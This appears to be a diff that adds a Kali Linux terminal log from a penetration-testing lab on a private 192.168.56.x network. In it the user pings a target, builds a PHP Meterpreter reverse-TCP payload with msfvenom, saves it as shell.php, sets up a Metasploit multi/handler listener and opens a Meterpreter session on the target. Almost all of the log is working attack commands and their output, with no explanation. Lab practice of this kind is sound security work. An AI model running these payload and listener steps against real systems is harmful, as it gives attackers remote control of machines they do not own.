@@ -1,0 +1,93 @@
+zsh: corrupt history file /home/kali/.zsh_history
+┌──(kali㉿kali)-[~]
+└─$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.56.101  netmask 255.255.255.0  broadcast 192.168.56.255
+        inet6 fe80::cb58:eed2:1479:64d6  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:d1:f8:5d  txqueuelen 1000  (Ethernet)
+        RX packets 2  bytes 876 (876.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 3152 (3.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8  bytes 480 (480.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 480 (480.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                                                                                                     
+┌──(kali㉿kali)-[~]
+└─$ ping192.168.56.102
+ping192.168.56.102: command not found
+                                                                                                     
+┌──(kali㉿kali)-[~]
+└─$ ping 192.168.56.102
+PING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.
+64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=3.74 ms
+64 bytes from 192.168.56.102: icmp_seq=2 ttl=64 time=2.49 ms
+64 bytes from 192.168.56.102: icmp_seq=3 ttl=64 time=3.20 ms
+64 bytes from 192.168.56.102: icmp_seq=4 ttl=64 time=7.57 ms
+64 bytes from 192.168.56.102: icmp_seq=5 ttl=64 time=25.6 ms
+^C
+--- 192.168.56.102 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4035ms
+rtt min/avg/max/mdev = 2.491/8.523/25.613/8.723 ms
+                                                                                                     
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw -o shell.php 
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 34927 bytes
+Saved as: shell.php
+                                                                                                     
+┌──(kali㉿kali)-[~]
+└─$ msfconsole                                                                                 
+Metasploit tip: Start commands with a space to avoid saving them to history
+                                                  
+
+                                   .,,.                  .                                           
+                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P                        
+                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p                      
+                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'                         
+  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P                         
+  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b                     
+ d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b                        
+d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88                             
+                          .a#$$$$$$"`          88b  d8P  88b`?8888P'                                 
+                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:                        
+                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'                      
+                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'                       
+              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'                        
+           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'                         
+_______________________________________________________________   ,&$$$$$$'_____                     
+                                                                 ll&&$$$$'                           
+                                                              .;;lll&&&&'                            
+                                                            ...;;lllll&'                             
+                                                          ......;;;llll;;;....                       
+                                                           ` ......;;;;... .  .                      
+                                                                                                     
+
+       =[ metasploit v6.4.64-dev                          ]
++ -- --=[ 2519 exploits - 1296 auxiliary - 431 post       ]
++ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+use exploit/multi/handler
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.56.101
+LHOST => 192.168.56.101
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.56.101:4444 
+[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:60791) at 2025-09-17 22:47:16 +0800
